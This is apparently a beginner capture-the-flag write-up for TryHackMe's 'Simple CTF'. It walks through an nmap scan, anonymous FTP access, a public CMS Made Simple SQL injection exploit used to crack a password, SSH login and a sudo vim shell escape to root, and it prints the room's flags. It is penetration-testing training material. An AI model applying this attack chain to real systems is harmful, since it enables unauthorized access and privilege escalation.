# Simple CTF
Beginner level ctf

![](Images/default_tryhackme.png)
## How many services are running under port 1000?
    
Let's run the nmap scan to see what ports are open.
```text
# Nmap 7.91 scan initiated Sat Jun  5 17:31:14 2021 as: nmap -sV -sC -Pn -oN nmap/scan 10.10.225.250
Nmap scan report for 10.10.225.250
Host is up (0.22s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  5 17:32:10 2021 -- 1 IP address (1 host up) scanned in 56.85 seconds
```
We got our answer 2222, 2048. So answer was 2. Let's hope over to ftp server **anonymous logins are allowed**. 

```bash
┌─[visith@parrot]─[~/CTF/thm/simple-ctf]
└──╼ $ftp 10.10.225.250
Connected to 10.10.225.250.
220 (vsFTPd 3.0.3)
Name (10.10.225.250:visith): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.01 secs (28.6564 kB/s)
ftp> exit
221 Goodbye.
```

1. What is running on the higher port?
2. What's the CVE you're using against the application?
3. To what kind of vulnerability is the application vulnerable?
Hint : You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass 
5. What's the password?
6. Where can you login with the details obtained?
7. What's the user flag?
8. Is there any other user in the home directory? What's its name?
9. What can you leverage to spawn a privileged shell?
10. What's the root flag?



























ftp login

```text
┌─[visith@parrot]─[~/CTF/thm/simple-ctf]
└──╼ $cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!


```

sql injection
```bash
CMS Made Simple < 2.2.10 - SQL Injection                                               | php/webapps/46635.py
```

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/simple-ctf]
└──╼ $python exploit.py -u http://10.10.225.250/simple/ --crack -w /opt/seclist/Passwords/Common-Credentials/best110.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

```bash
─[✗]─[visith@parrot]─[~/CTF/thm/simple-ctf]
└──╼ $ssh mitch@10.10.225.250 -p 2222
The authenticity of host '[10.10.225.250]:2222 ([10.10.225.250]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.225.250]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.225.250's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ /usr/bin/script -qc /bin/bash /dev/null
mitch@Machine:~$ ls
user.txt
mitch@Machine:~$ cat user.txt 
G00d j0b, keep up!
mitch@Machine:~$ cd /home
mitch@Machine:/home$ ls
mitch  sunbath
```


```bash
mitch@Machine:/dev/shm$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim


```
```bash
root@Machine:/dev/shm# sudo /usr/bin/vim -c ':!/bin/sh'

# ^[[2;2R^[]11;rgb:0000/0000/0000^Gls
/bin/sh: 1: ot found
/bin/sh: 1: 2Rls: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
linlog.txt  pulse-shm-1034407193  pulse-shm-2781484612	pulse-shm-672862991
linpeas.sh  pulse-shm-2251046261  pulse-shm-4152258295
# cd ~
# ls
user.txt
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```